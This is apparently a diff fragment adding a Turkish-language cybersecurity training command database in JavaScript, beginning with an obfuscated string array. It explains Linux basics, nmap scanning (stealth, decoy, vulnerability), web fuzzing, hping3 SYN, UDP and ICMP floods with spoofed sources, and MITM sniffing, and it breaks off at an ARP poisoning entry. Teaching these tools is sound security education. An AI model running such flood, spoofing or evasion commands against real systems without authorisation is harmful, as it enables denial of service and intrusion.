'Bilgisayarın\x20yerel\x20ağdaki\x20IP\x20adresini\x20(192.168.x.x)\x20ve\x20Loopback\x20(127.0.0.1)\x20durumunu\x20detaylı\x20gösterir.', 'GÜVENLİK\x20BAŞLIK\x20DENETİMİ', 'Sistemde\x20Dinlenen\x20Tüm\x20Portları\x20ve\x20İşlemleri\x20Görme\x20(ss\x20-tulpn)', 'sysctl\x20-w\x20net.ipv4.tcp_syncookies=1', '1.\x20Linux\x20Temelleri']; _0x1583 = function () { return _0x13deb7; }; return _0x1583(); }
+
+// ==========================================================================
+// SİBER GÜVENLİK AKADEMİSİ // 140+ GERÇEK ÇALIŞTIRILABİLİR KOMUT VERİTABANI
+// Sıfırdan Başlayanlar İçin Detaylı Türkçe Anlatımlı Komut Kütüphanesi
+// ==========================================================================
+
+window.ACADEMY_COMMANDS = [
+    // ----------------------------------------------------------------------
+    // KATEGORİ 1: TEMEL LINUX & SİSTEM GEZİNME (15 Komut)
+    // ----------------------------------------------------------------------
+    {
+        id: 1,
+        category: "linux",
+        categoryName: "1. Linux Temelleri",
+        badge: "KULLANICI TESPİTİ",
+        title: "Şu An Hangi Kullanıcıyım? (whoami)",
+        desc: "Terminalde hangi yetkiyle çalıştığınızı gösterir. Sistemde normal kullanıcı mısınız yoksa en yetkili süper kullanıcı (root) musunuz hemen söyler.",
+        cmd: "whoami"
+    },
+    {
+        id: 2,
+        category: "linux",
+        categoryName: "1. Linux Temelleri",
+        badge: "KİMLİK & GRUPLAR",
+        title: "Kullanıcı Kimlik Numarası ve Grupları İnceleme (id)",
+        desc: "Kullanıcının UID (User ID), GID (Group ID) ve dahil olduğu güvenlik gruplarını (sudo, adm, kvm) listeler. Sudo hakkınız olup olmadığını anlamak için ilk bakılan komuttur.",
+        cmd: "id"
+    },
+    {
+        id: 3,
+        category: "linux",
+        categoryName: "1. Linux Temelleri",
+        badge: "KONUM TESPİTİ",
+        title: "Şu Anda Hangi Klasördeyim? (pwd - Print Working Directory)",
+        desc: "Terminalde nerede olduğunuzu asla kaybetmemeniz için tam dosya yolu konumunuzu (örneğin /home/Sunny) ekrana yazdırır.",
+        cmd: "pwd"
+    },
+    {
+        id: 4,
+        category: "linux",
+        categoryName: "1. Linux Temelleri",
+        badge: "DOSYA LİSTELEME",
+        title: "Gizli Dosyalar ve İzinlerle Birlikte Klasör İçeriğini Listeleme (ls -la)",
+        desc: "Nokta ile başlayan gizli sistem dosyaları dahil tüm dosyaları dosya izinleri (rwx), sahibi ve boyutu ile ayrıntılı tablo halinde döker.",
+        cmd: "ls -la"
+    },
+    {
+        id: 5,
+        category: "linux",
+        categoryName: "1. Linux Temelleri",
+        badge: "GÜVENLİK GÜNLÜĞÜ",
+        title: "Sistem Log Klasörüne Geçiş Yapma (cd /var/log)",
+        desc: "Linux işletim sistemindeki tüm kimlik doğrulama, hata ve ağ günlüklerinin saklandığı kritik log dizinine geçiş yapar.",
+        cmd: "cd /var/log"
+    },
+    {
+        id: 6,
+        category: "linux",
+        categoryName: "1. Linux Temelleri",
+        badge: "HESAP ANALİZİ",
+        title: "Sistemdeki Tüm Kullanıcı Hesaplarını Okuma (cat /etc/passwd)",
+        desc: "Linux'taki tüm kayıtlı yerel hesapları, varsayılan kabuklarını (bash, nologin) ve ev dizinlerini listeler. Şifreler burada tutulmaz.",
+        cmd: "cat /etc/passwd"
+    },
+    {
+        id: 7,
+        category: "linux",
+        categoryName: "1. Linux Temelleri",
+        badge: "HATA AYIKLAMA",
+        title: "Log Dosyasında 'error' Kelimesini Filtreleme (grep)",
+        desc: "Binlerce satırlık sistem günlüğü içinde yalnızca güvenlik veya çalışma hatalarını süzerek ekrana getirir.",
+        cmd: "grep -i 'error' /var/log/syslog"
+    },
+    {
+        id: 8,
+        category: "linux",
+        categoryName: "1. Linux Temelleri",
+        badge: "GÜVENLİ DİZİN",
+        title: "Yeni Güvenli Çalışma Dizinleri Oluşturma (mkdir -p)",
+        desc: "Siber testleriniz için hiyerarşik klasör yapısını tek seferde oluşturur.",
+        cmd: "mkdir -p /opt/tools/recon"
+    },
+    {
+        id: 9,
+        category: "linux",
+        categoryName: "1. Linux Temelleri",
+        badge: "İZİN YÖNETİMİ",
+        title: "SSH Özel Anahtarını Yalnızca Sahibine Okunur Kılma (chmod 600)",
+        desc: "Kritik güvenlik anahtarlarını diğer kullanıcıların okumasını engeller. SSH bunu zorunlu tutar; aksi halde anahtar reddedilir.",
+        cmd: "chmod 600 id_rsa"
+    },
+    {
+        id: 10,
+        category: "linux",
+        categoryName: "1. Linux Temelleri",
+        badge: "SAHİPLİK AYARI",
+        title: "Dosya Sahipliğini Güvenlik Yöneticisine Devretme (chown root:root)",
+        desc: "Dosyanın mülkiyetini kök kullanıcıya vererek standart kullanıcıların değiştirmesini engeller.",
+        cmd: "sudo chown root:root /etc/shadow"
+    },
+    {
+        id: 11,
+        category: "linux",
+        categoryName: "1. Linux Temelleri",
+        badge: "ÇEKİRDEK SÜRÜMÜ",
+        title: "İşletim Sistemi Çekirdeği ve Mimarisi Bilgisi (uname -a)",
+        desc: "Linux çekirdeğinin tam sürümünü gösterir. Bilinen Kernel exploit açıklarını (Dirty COW, Dirty Pipe vb.) tespit etmek için ilk bakılan komuttur.",
+        cmd: "uname -a"
+    },
+    {
+        id: 12,
+        category: "linux",
+        categoryName: "1. Linux Temelleri",
+        badge: "DİSK DOLULUĞU",
+        title: "Disk Alanını İnsan Tarafından Okunabilir Formatta Görme (df -h)",
+        desc: "Sunucu disklerinin doluluk oranını (GB cinsinden) gösterir. Dolu diskler log kaydını durdurarak güvenlik açığına sebep olabilir.",
+        cmd: "df -h"
+    },
+    {
+        id: 13,
+        category: "linux",
+        categoryName: "1. Linux Temelleri",
+        badge: "BELLEK KULLANIMI",
+        title: "Canlı RAM ve Takas Alanı Durumu (free -m)",
+        desc: "Sistemin kaç MB RAM kullandığını ve bellek taşması riski olup olmadığını anlık gösterir.",
+        cmd: "free -m"
+    },
+    {
+        id: 14,
+        category: "linux",
+        categoryName: "1. Linux Temelleri",
+        badge: "İŞLEM TAKİBİ",
+        title: "Çalışan Güvenlik Servisini ve İşlemleri Bulma (ps aux)",
+        desc: "Sistemde arka planda çalışan tüm uygulamaları, CPU/RAM tüketimlerini ve PID kimliklerini gösterir.",
+        cmd: "ps aux | grep dotnet"
+    },
+    {
+        id: 15,
+        category: "linux",
+        categoryName: "1. Linux Temelleri",
+        badge: "AĞ ARAYÜZÜ",
+        title: "Ağ Kartlarının IP ve MAC Adreslerini Öğrenme (ip a)",
+        desc: "Bilgisayarın yerel ağdaki IP adresini (192.168.x.x) ve Loopback (127.0.0.1) durumunu detaylı gösterir.",
+        cmd: "ip a"
+    },
+    {
+        id: "15b",
+        category: "linux",
+        categoryName: "1. Linux Temelleri",
+        badge: "WHOIS & DNS KEŞFİ",
+        title: "Hedef Alan Adı Kayıt ve Sahiplik Bilgisi Sorgulama (whois)",
+        desc: "Hedef web sitesinin barındığı sunucuları, DNS kayıtlarını ve alan adı sahibini açık kaynaklardan sorgular.",
+        cmd: "whois lostfromlight.com"
+    },
+
+    // ----------------------------------------------------------------------
+    // KATEGORİ 2: AĞ KEŞFİ & NMAP İLE PORT TARAMASI (20 Komut)
+    // ----------------------------------------------------------------------
+    {
+        id: 16,
+        category: "nmap",
+        categoryName: "2. Ağ & Nmap",
+        badge: "TÜM PORTLAR",
+        title: "Bilgisayardaki Tüm 65,535 Portu Tarama (nmap -p-)",
+        desc: "Hedefte hiçbir gölge servisin (Shadow IT) unutulmaması için 1'den 65.535'e kadar tüm TCP portlarını denetler.",
+        cmd: "nmap -p- 127.0.0.1"
+    },
+    {
+        id: 17,
+        category: "nmap",
+        categoryName: "2. Ağ & Nmap",
+        badge: "TEKİL PORT",
+        title: "Belirli Bir Portun (8080) Durumunu Kontrol Etme (nmap 8080/tcp)",
+        desc: "Yalnızca web proxy veya geliştirici portu olan 8080'in açık olup olmadığını ve servisin yanıt verip vermediğini test eder.",
+        cmd: "nmap 8080/tcp 127.0.0.1"
+    },
+    {
+        id: 18,
+        category: "nmap",
+        categoryName: "2. Ağ & Nmap",
+        badge: "HIZLI KEŞİF",
+        title: "En Yaygın 100 Portu Hızlıca Tarama (nmap -F)",
+        desc: "Zaman kısıtlıyken en kritik 100 portu 1 saniyeden kısa sürede tarayarak hızlı durum raporu sunar.",
+        cmd: "nmap -F 192.168.1.1"
+    },
+    {
+        id: 19,
+        category: "nmap",
+        categoryName: "2. Ağ & Nmap",
+        badge: "GİZLİ CİHAZ",
+        title: "Ping Korumalı Gizli Cihazları Taramaya Zorlama (nmap -Pn)",
+        desc: "Hedef güvenlik duvarı ping paketlerini engellese bile cihazın açık olduğunu varsayarak portları tarar.",
+        cmd: "nmap -Pn 192.168.1.1"
+    },
+    {
+        id: 20,
+        category: "nmap",
+        categoryName: "2. Ağ & Nmap",
+        badge: "VERSİYON TESPİTİ",
+        title: "Servis ve Tam Sürüm Numarasını Yakalama (nmap -sV)",
+        desc: "Açık olan portun arkasında hangi yazılımın (örn: Apache 2.4.49 veya Nginx 1.18) çalıştığını öğrenir.",
+        cmd: "nmap -sV -p 49152 192.168.1.1"
+    },
+    {
+        id: 21,
+        category: "nmap",
+        categoryName: "2. Ağ & Nmap",
+        badge: "PING SWEEP",
+        title: "Ağdaki Tüm Aktif Cihazları Listeleme (nmap -sn)",
+        desc: "Port taraması yapmadan sadece ping atarak ağdaki hangi IP adreslerinin açık olduğunu birkaç saniyede haritalandırır.",
+        cmd: "sudo nmap -sn 192.168.1.0/24"
+    },
+    {
+        id: 22,
+        category: "nmap",
+        categoryName: "2. Ağ & Nmap",
+        badge: "İŞLETİM SİSTEMİ",
+        title: "Hedef Cihazın İşletim Sistemini Tahmin Etme (nmap -O)",
+        desc: "TCP/IP yığınının tepkilerini (TTL değerleri vb.) analiz ederek hedef cihazın Windows mu Linux mu olduğunu deşifre eder.",
+        cmd: "sudo nmap -O 192.168.1.17"
+    },
+    {
+        id: 23,
+        category: "nmap",
+        categoryName: "2. Ağ & Nmap",
+        badge: "ÇOKLU PORT",
+        title: "Birden Fazla Özel Portun Servis Detayları (nmap -sV -p ...)",
+        desc: "Yalnızca ilgilenilen belirli servis portlarının parmak izini çıkarır.",
+        cmd: "sudo nmap -sV -p 5000,7000,7100,62078 192.168.1.17"
+    },
+    {
+        id: 24,
+        category: "nmap",
+        categoryName: "2. Ağ & Nmap",
+        badge: "GİZLİ & SESSİZ",
+        title: "Stealth SYN Taraması & IDS Atlatma (nmap -sS -T2)",
+        desc: "Bağlantıyı tamamlamadan (3-way handshake yapmadan) sadece kapıyı tıklar ve paketleri yavaş göndererek güvenlik duvarlarından gizlenir.",
+        cmd: "nmap -sS -T2 192.168.1.1"
+    },
+    {
+        id: 25,
+        category: "nmap",
+        categoryName: "2. Ağ & Nmap",
+        badge: "ZAFİYET MOTORU",
+        title: "NSE Motoru ile Zafiyet Veritabanı Taraması (nmap --script vuln)",
+        desc: "Hedef portlardaki servisleri Nmap'in geniş güvenlik açığı arşiviyle karşılaştırarak bilinen CVE açıklarını listeler.",
+        cmd: "nmap --script vuln 192.168.1.1"
+    },
+    {
+        id: 26,
+        category: "nmap",
+        categoryName: "2. Ağ & Nmap",
+        badge: "UDP SERVİSLERİ",
+        title: "UDP Portlarını Denetleme (nmap -sU)",
+        desc: "DNS (53), DHCP (67) ve SNMP (161) gibi TCP kullanmayan UDP tabanlı kritik servisleri tarar.",
+        cmd: "sudo nmap -sU -p 53,67,161 192.168.1.1"
+    },
+    {
+        id: 27,
+        category: "nmap",
+        categoryName: "2. Ağ & Nmap",
+        badge: "TAM DETAY",
+        title: "Agresif Hepsi Bir Arada Tarama (nmap -A)",
+        desc: "İşletim sistemi tespiti, sürüm tespiti, traceroute ve varsayılan script taramalarının tamamını tek komutta birleştirir.",
+        cmd: "nmap -A 192.168.1.1"
+    },
+    {
+        id: 28,
+        category: "nmap",
+        categoryName: "2. Ağ & Nmap",
+        badge: "EN ÖNEMLİ 20 PORT",
+        title: "Dünyanın En Çok Saldırı Alan 20 Portu (nmap --top-ports 20)",
+        desc: "İnternette en çok açık bırakılan 20 kritik servis portunu hızlıca denetler.",
+        cmd: "nmap --top-ports 20 127.0.0.1"
+    },
+    {
+        id: 29,
+        category: "nmap",
+        categoryName: "2. Ağ & Nmap",
+        badge: "SSL/TLS SERTİFİKA",
+        title: "Web Sunucusunun SSL Sertifikasını İnceleme (ssl-cert script)",
+        desc: "HTTPS sertifikasının süresini, kime ait olduğunu ve şifreleme algoritmasını ekrana döker.",
+        cmd: "nmap -p 443 --script ssl-cert 127.0.0.1"
+    },
+    {
+        id: 30,
+        category: "nmap",
+        categoryName: "2. Ağ & Nmap",
+        badge: "GÜVENLİK BAŞLIKLARI",
+        title: "HTTP Güvenlik Başlıklarını Nmap ile Okuma (http-headers)",
+        desc: "Hedef web sunucusunun HSTS, CSP ve X-Frame-Options başlıklarını döndürüp döndürmediğini kontrol eder.",
+        cmd: "nmap -p 80 --script http-headers 127.0.0.1"
+    },
+    {
+        id: 31,
+        category: "nmap",
+        categoryName: "2. Ağ & Nmap",
+        badge: "ANONİM FTP",
+        title: "FTP Sunucusunda Parolasız Giriş Kontrolü (ftp-anon)",
+        desc: "FTP portunda kullanıcı adı 'anonymous' ve boş parola ile içeri girilip girilemediğini test eder.",
+        cmd: "nmap -p 21 --script ftp-anon 192.168.1.1"
+    },
+    {
+        id: 32,
+        category: "nmap",
+        categoryName: "2. Ağ & Nmap",
+        badge: "SMB ETERNALBLUE",
+        title: "WannaCry / MS17-010 SMB Zafiyeti Taraması (smb-vuln-ms17-010)",
+        desc: "Fidye yazılımlarının kullandığı tarihi Windows dosya paylaşım açığının hedefte bulunup bulunmadığını test eder.",
+        cmd: "nmap -p 445 --script smb-vuln-ms17-010 192.168.1.10"
+    },
+    {
+        id: 33,
+        category: "nmap",
+        categoryName: "2. Ağ & Nmap",
+        badge: "SAHTE IP (DECOY)",
+        title: "Gerçek IP'yi Sahte İstemciler Arasında Gizleme (nmap -D)",
+        desc: "Araya 10 adet rastgele sahte IP serpiştirerek hedef güvenlik duvarının gerçek saldırgan IP'sini tespit etmesini imkansızlaştırır.",
+        cmd: "nmap -D RND:10 192.168.1.1"
+    },
+    {
+        id: 34,
+        category: "nmap",
+        categoryName: "2. Ağ & Nmap",
+        badge: "ROTA İZLEME",
+        title: "Hedefe Giderken Hangi Yönlendiricilerden Geçildi? (--traceroute)",
+        desc: "Paketinizin hedefe ulaşana kadar geçtiği tüm ara santralleri ve ağ düğümlerini milisaniye cinsinden çizer.",
+        cmd: "nmap --traceroute 8.8.8.8"
+    },
+    {
+        id: 35,
+        category: "nmap",
+        categoryName: "2. Ağ & Nmap",
+        badge: "RAPOR KAYDI",
+        title: "Tarama Sonuçlarını Metin Dosyasına Kaydetme (-oN)",
+        desc: "Tarama raporunu daha sonra kurumsal sızma testi belgesi olarak sunabilmek için bir txt dosyasına kaydeder.",
+        cmd: "nmap -oN scan_results.txt 127.0.0.1"
+    },
+
+    // ----------------------------------------------------------------------
+    // KATEGORİ 3: WEB DİZİN KEŞFİ, FUZZING & GİZLİ DOSYALAR (15 Komut)
+    // ----------------------------------------------------------------------
+    {
+        id: 36,
+        category: "web",
+        categoryName: "3. Web & Fuzzing",
+        badge: "GİZLİ KLASÖRLER",
+        title: "Web Sitesindeki Gizli Dizinleri Bulma (Gobuster)",
+        desc: "Kelime listesi kullanarak web sitesinde unutulmuş /admin, /backup, /api ve /config gibi dizinleri ortaya çıkarır.",
+        cmd: "gobuster dir -u http://192.168.1.1 -w /usr/share/wordlists/dirb/common.txt"
+    },
+    {
+        id: 37,
+        category: "web",
+        categoryName: "3. Web & Fuzzing",
+        badge: "UZANTI TARAMASI",
+        title: "Yedek ve Veritabanı Dosyalarını Bulma (Gobuster -x)",
+        desc: "Dizinlerin yanında .php, .bak, .zip, .sql ve .txt uzantılı unutulan yedek dosyalarını da tarar.",
+        cmd: "gobuster dir -u http://127.0.0.1 -w common.txt -x php,bak,zip,sql,txt"
+    },
+    {
+        id: 38,
+        category: "web",
+        categoryName: "3. Web & Fuzzing",
+        badge: "ULTRA HIZLI FUZZER",
+        title: "Çok Yüksek Hızlı Asenkron Web Fuzzing (FFuf)",
+        desc: "Saniyede yüzlerce GET isteği göndererek sunucuda gizlenen veya hata döndüren her parametreyi tespit eder.",
+        cmd: "ffuf -u http://127.0.0.1/FUZZ -w /usr/share/wordlists/dirb/common.txt"
+    },
+    {
+        id: 39,
+        category: "web",
+        categoryName: "3. Web & Fuzzing",
+        badge: "DURUM FİLTRESİ",
+        title: "Yalnızca 200 OK ve 301 Yönlendirmeleri Gösterme (FFuf -mc)",
+        desc: "404 Not Found hatalarını gizleyip sadece gerçekten var olan geçerli sayfaları listeler.",
+        cmd: "ffuf -u http://127.0.0.1/FUZZ -w common.txt -mc 200,301"
+    },
+    {
+        id: 40,
+        category: "web",
+        categoryName: "3. Web & Fuzzing",
+        badge: "BEARER TOKEN FUZZ",
+        title: "API Yetkilendirme Başlığı Fuzzing (FFuf -H)",
+        desc: "HTTP başlığında farklı API token veya yetkilendirme parametrelerini deneyerek yetki aşımını test eder.",
+        cmd: "ffuf -w wordlist.txt -u http://127.0.0.1/api/profile -H \"Authorization: Bearer FUZZ\""
+    },
+    {
+        id: 41,
+        category: "web",
+        categoryName: "3. Web & Fuzzing",
+        badge: "KLASİK DİZİN TARAYICI",
+        title: "Standart Web İçerik Keşfi (Dirb)",
+        desc: "Klasik ve güvenilir web tarayıcı aracıyla sunucudaki kök klasörleri sırayla dener.",
+        cmd: "dirb http://192.168.1.1 /usr/share/wordlists/dirb/common.txt"
+    },
+    {
+        id: 42,
+        category: "web",
+        categoryName: "3. Web & Fuzzing",
+        badge: "GELİŞMİŞ FİLTRE",
+        title: "404 Kodlarını Gizleyen Renkli Fuzzer (Wfuzz)",
+        desc: "Hata sayfalarını eleyerek yalnızca gizli kalmış parametreleri ve değişkenleri ortaya çıkarır.",
+        cmd: "wfuzz -c -z file,common.txt --hc 404 http://127.0.0.1/FUZZ"
+    },
+    {
+        id: 43,
+        category: "web",
+        categoryName: "3. Web & Fuzzing",
+        badge: "WEB ZAFİYET TARAMASI",
+        title: "Web Sunucusu Yapılandırma ve Açık Taraması (Nikto)",
+        desc: "Sunucudaki tehlikeli varsayılan dosyaları, eski yazılım sürümlerini ve eksik HTTP başlıklarını tespit eder.",
+        cmd: "nikto -h 192.168.1.1"
+    },
+    {
+        id: 44,
+        category: "web",
+        categoryName: "3. Web & Fuzzing",
+        badge: "TEKNOLOJİ PARMAK İZİ",
+        title: "Web Sitesinin Kullandığı Altyapıyı Deşifre Etme (WhatWeb)",
+        desc: "Web sitesinin hangi CMS (WordPress, Joomla), programlama dili (ASP.NET, PHP) ve sunucuyu (Kestrel, Nginx) kullandığını anlar.",
+        cmd: "whatweb http://127.0.0.1"
+    },
+    {
+        id: 45,
+        category: "web",
+        categoryName: "3. Web & Fuzzing",
+        badge: "ALT ALAN ADI",
+        title: "Şirketin Gizli Alt Alan Adlarını Bulma (Sublist3r)",
+        desc: "Arama motorlarından ve DNS arşivlerinden faydalanarak dev.sirket.com veya test.sirket.com gibi gölge alan adlarını keşfeder.",
+        cmd: "sublist3r -d lfl.local"
+    },
+    {
+        id: 46,
+        category: "web",
+        categoryName: "3. Web & Fuzzing",
+        badge: "ÖZEL PARAMETRE",
+        title: "Gizli GET/POST Parametrelerini Keşfetme (Arjun)",
+        desc: "Web sayfalarında kod geliştiricilerin unuttuğu ?debug=true veya ?admin=1 gibi gizli parametreleri otomatik yakalar.",
+        cmd: "arjun -u http://127.0.0.1/api/search"
+    },
+    {
+        id: 47,
+        category: "web",
+        categoryName: "3. Web & Fuzzing",
+        badge: "TARAYICI ÖZETİ",
+        title: "Sadece Sunucu Başlıklarını Hızlıca Alma (curl -I)",
+        desc: "Web sayfasının içeriğini indirmeden sadece sunucu başlıklarını (Server, Date, Content-Type) çekerek hızlı inceleme yapar.",
+        cmd: "curl -I http://127.0.0.1"
+    },
+    {
+        id: 48,
+        category: "web",
+        categoryName: "3. Web & Fuzzing",
+        badge: "REKÜRSİF KEŞİF",
+        title: "Derinlemesine Dizin Ağacı Tarayıcı (Feroxbuster)",
+        desc: "Rust dilinde yazılmış modern araç; bulduğu her alt dizinin içine otomatik girerek derinlemesine tarama yapar.",
+        cmd: "feroxbuster -u http://127.0.0.1"
+    },
+    {
+        id: 49,
+        category: "web",
+        categoryName: "3. Web & Fuzzing",
+        badge: "WORDPRESS DENETİMİ",
+        title: "WordPress Eklenti ve Kullanıcı Taraması (WPScan)",
+        desc: "Hedef sitedeki güncellenmemiş güvensiz WordPress eklentilerini ve admin kullanıcı adlarını listeler.",
+        cmd: "wpscan --url http://127.0.0.1 --enumerate u,vp"
+    },
+    {
+        id: 50,
+        category: "web",
+        categoryName: "3. Web & Fuzzing",
+        badge: "ARŞİV BAĞLANTILARI",
+        title: "Geçmişte Açık Olan Web Adreslerini Çekme (waybackurls)",
+        desc: "Wayback Machine internet arşivini sorgulayarak sitenin yıllar önce yayında olan gizli linklerini bulur.",
+        cmd: "waybackurls target.com"
+    },
+
+    // ----------------------------------------------------------------------
+    // KATEGORİ 4: PAKET ÜRETİMİ, FIREWALL ANALİZİ & HPING3 (15 Komut)
+    // ----------------------------------------------------------------------
+    {
+        id: 51,
+        category: "packet",
+        categoryName: "4. Paket & Firewall",
+        badge: "SYN PAKET TESTİ",
+        title: "Manuel TCP SYN Paketiyle Port Açık mı Sorgulama (hping3 -S)",
+        desc: "Hedefe 1 adet ham TCP SYN paketi fırlatır. Karşıdan SYN-ACK dönerse port açıktır, RST dönerse kapalıdır.",
+        cmd: "sudo hping3 -S -p 80 -c 1 192.168.1.1"
+    },
+    {
+        id: 52,
+        category: "packet",
+        categoryName: "4. Paket & Firewall",
+        badge: "FIREWALL TESTİ",
+        title: "ACK Bayrağı ile Güvenlik Duvarı Tepkisini Ölçme (hping3 -A)",
+        desc: "Doğrudan ACK paketi göndererek güvenlik duvarının durum takipli (stateful) olup olmadığını analiz eder.",
+        cmd: "sudo hping3 -A -p 80 -c 1 192.168.1.1"
+    },
+    {
+        id: 53,
+        category: "packet",
+        categoryName: "4. Paket & Firewall",
+        badge: "ICMP TESTİ",
+        title: "Hedefe Özel ICMP Echo Paketi Yollama (hping3 -1)",
+        desc: "Standart ping programından farklı olarak paket boyutunu ve sıklığını kontrol edebileceğiniz ICMP paketi atar.",
+        cmd: "hping3 -1 127.0.0.1 -c 3"
+    },
+    {
+        id: 54,
+        category: "packet",
+        categoryName: "4. Paket & Firewall",
+        badge: "SSH PORT DENETİMİ",
+        title: "Belirli Porta Manuel SYN Paketi Yollama (hping3 -p 22)",
+        desc: "SSH portunun (22) bağlantı kabul etme hızını ve TTL paket düşüşünü test eder.",
+        cmd: "hping3 -S -p 22 127.0.0.1"
+    },
+    {
+        id: 55,
+        category: "packet",
+        categoryName: "4. Paket & Firewall",
+        badge: "DOS SİMÜLASYONU",
+        title: "Rastgele IP'lerle UDP Flood Saldırı Testi (hping3 --flood)",
+        desc: "Sahte kaynak IP adresleri üreterek güvenlik duvarının DDoS savunma mekanizmasını (Rate Limiting) test eder.",
+        cmd: "sudo hping3 --udp --flood --rand-source -p 80 192.168.1.1"
+    },
+    {
+        id: 56,
+        category: "packet",
+        categoryName: "4. Paket & Firewall",
+        badge: "SYN FLOOD",
+        title: "TCP SYN Flood Yük Testi (hping3 -S --flood)",
+        desc: "Sunucunun TCP bağlantı tablosunu doldurmaya çalışarak SYN Cookies savunmasının devrede olup olmadığını kontrol eder.",
+        cmd: "sudo hping3 -S -p 80 --flood 127.0.0.1"
+    },
+    {
+        id: 57,
+        category: "packet",
+        categoryName: "4. Paket & Firewall",
+        badge: "XMAS AĞ TARAMASI",
+        title: "FIN, URG ve PUSH Bayraklı Xmas Paketi (hping3 -F -P -U)",
+        desc: "TCP paketinde aynı anda olmaması gereken bayrakları yakarak eski tip filtreleri ve işletim sistemlerini ayırt eder.",
+        cmd: "sudo hping3 -F -P -U -p 80 127.0.0.1 -c 1"
+    },
+    {
+        id: 58,
+        category: "packet",
+        categoryName: "4. Paket & Firewall",
+        badge: "UDP PAKETİ",
+        title: "DNS Portuna Ham UDP Paketi Enjeksiyonu (hping3 -2)",
+        desc: "Hedefin 53 numaralı UDP portuna paket yollayarak ICMP Port Unreachable dönüp dönmediğini sınar.",
+        cmd: "sudo hping3 -2 -p 53 192.168.1.1 -c 2"
+    },
+    {
+        id: 59,
+        category: "packet",
+        categoryName: "4. Paket & Firewall",
+        badge: "BOZUK SAĞLAMA",
+        title: "Bozuk Checksum ile IDS Tespiti (hping3 --badcksum)",
+        desc: "Bozuk TCP sağlama toplamına sahip paket yollar; hedef paketleri çöpe atarken ara ağ cihazları paketi işliyorsa tespit edilir.",
+        cmd: "sudo hping3 -p 80 --badcksum 127.0.0.1 -c 1"
+    },
+    {
+        id: 60,
+        category: "packet",
+        categoryName: "4. Paket & Firewall",
+        badge: "ZAMAN DAMGASI",
+        title: "TCP Zaman Damgası ile Cihaz Uptime Tespiti (tcp-timestamp)",
+        desc: "Cihazın kaç gündür yeniden başlatılmadığını (uptime) tahmin etmek için TCP zaman damgası bayrağını kullanır.",
+        cmd: "sudo hping3 -p 80 --tcp-timestamp 127.0.0.1 -c 1"
+    },
+    {
+        id: 61,
+        category: "packet",
+        categoryName: "4. Paket & Firewall",
+        badge: "MODERN NPING",
+        title: "Çok Portlu Ağ Test Paketi Üreticisi (nping)",
+        desc: "Nmap ekibi tarafından geliştirilen modern paket aracıyla hem 80 hem 443'e aynı anda SYN gönderir.",
+        cmd: "sudo nping --tcp -p 80,443 --flags syn 127.0.0.1"
+    },
+    {
+        id: 62,
+        category: "packet",
+        categoryName: "4. Paket & Firewall",
+        badge: "YÜKSEK HIZLI PING",
+        title: "Tüm Ağ Bloğuna Paralel Hızlı Ping Taraması (fping)",
+        desc: "Tek tek beklemek yerine aynı anda tüm alt ağdaki 254 cihaza ping atarak açık cihazları 0.2 saniyede yakalar.",
+        cmd: "sudo fping -a -g 192.168.1.0/24"
+    },
+    {
+        id: 63,
+        category: "packet",
+        categoryName: "4. Paket & Firewall",
+        badge: "PORT TEPKİ SÜRESİ",
+        title: "TCP Port Gecikmesini Ölçme (tcpping)",
+        desc: "Web portunun bağlantı kabul etme gecikmesini milisaniye hassasiyetinde ölçer.",
+        cmd: "tcpping 127.0.0.1 80"
+    },
+    {
+        id: 64,
+        category: "packet",
+        categoryName: "4. Paket & Firewall",
+        badge: "ICMP FLOOD",
+        title: "Ping Boğma Simülasyonu (hping3 --icmp --flood)",
+        desc: "Ağ kartının ICMP paket işleme sınırını test eder. Modern sistemlerde ICMP Rate Limiting bunu engeller.",
+        cmd: "sudo hping3 --icmp --flood 127.0.0.1"
+    },
+    {
+        id: 65,
+        category: "packet",
+        categoryName: "4. Paket & Firewall",
+        badge: "ÖZEL PAKET MOTORU",
+        title: "Python ile Ham Paket İnşa Etme (Scapy)",
+        desc: "İstediğiniz TCP/IP bayrağını ve yükünü sıfırdan yazarak güvenlik açıklarını test edebileceğiniz Python ortamıdır.",
+        cmd: "sudo scapy"
+    },
+
+    // ----------------------------------------------------------------------
+    // KATEGORİ 5: ORTADAKİ ADAM (MITM), PAKET DİNLEME & TRAFİK YAKALAMA (12 Komut)
+    // ----------------------------------------------------------------------
+    {
+        id: 66,
+        category: "mitm",
+        categoryName: "5. MITM & Dinleme",
+        badge: "DİNLEME ÇERÇEVESİ",
+        title: "Ağ Analizi ve Dinleme Başlatma (Bettercap)",
+        desc: "Yerel ağ arayüzünde dinleme başlatır; yetkisiz şifresiz HTTP/FTP oturumlarını tespit etmek için kullanılır.",
+        cmd: "bettercap -iface lo"
+    },
+    {
+        id: 67,
+        category: "mitm",
+        categoryName: "5. MITM & Dinleme",
+        badge: "HAM PAKET YAKALAYICI",
+        title: "HTTP Trafiğini Canlı İzleme (tcpdump)",
+        desc: "Ağ kartından geçen paketleri ham olarak yakalar ve ekranda kaynak/hedef IP ile birlikte görüntüler.",
+        cmd: "sudo tcpdump -i eth0 -nn -s0 -v port 80"
+    },
+    {
+        id: 68,
+        category: "mitm",
+        categoryName: "5. MITM & Dinleme",
+        badge: "SYN BAYRAK YAKALAMA",
+        title: "Gelen Bağlantı Taleplerini Canlı Takip Etme (tcpdump SYN)",
+        desc: "Yalnızca yeni kurulan bağlantıların (SYN bayraklı) paketlerini filtreleyerek port taramalarını gerçek zamanlı yakalar.",
+        cmd: "sudo tcpdump -i eth0 \"tcp[tcpflags] & (tcp-syn) != 0\""
+    },
+    {
+        id: 69,
+        category: "mitm",
+        categoryName: "5. MITM & Dinleme",
+        badge: "TERMİNAL WIRESHARK",
+        title: "Wireshark Filtreleri ile Paket Yakalama (Tshark)",
+        desc: "Dünyaca ünlü Wireshark aracının terminal sürümüdür; GUI olmadan sunucularda derin paket analizi yapar.",
+        cmd: "tshark -i 1 -c 15"
+    },
+    {
+        id: 70,
+        category: "mitm",
+        categoryName: "5. MITM & Dinleme",
+        badge: "HTTP URL FİLTRESİ",
+        title: "Gidilen Web Sitelerini Ekrana Dökme (Tshark HTTP)",
+        desc: "Ağdaki şifresiz HTTP isteklerinin Host ve URI adreslerini ayıklayarak canlı listeler.",
+        cmd: "tshark -i 1 -Y \"http.request\" -T fields -e http.host -e http.request.uri"
+    },
+    {
+        id: 71,
+        category: "mitm",
+        categoryName: "5. MITM & Dinleme",
+        badge: "ARP ZEHİRLEME",
+        title: "ARP Önbellek Zehirleme Simülasyonu (arpspoof)",
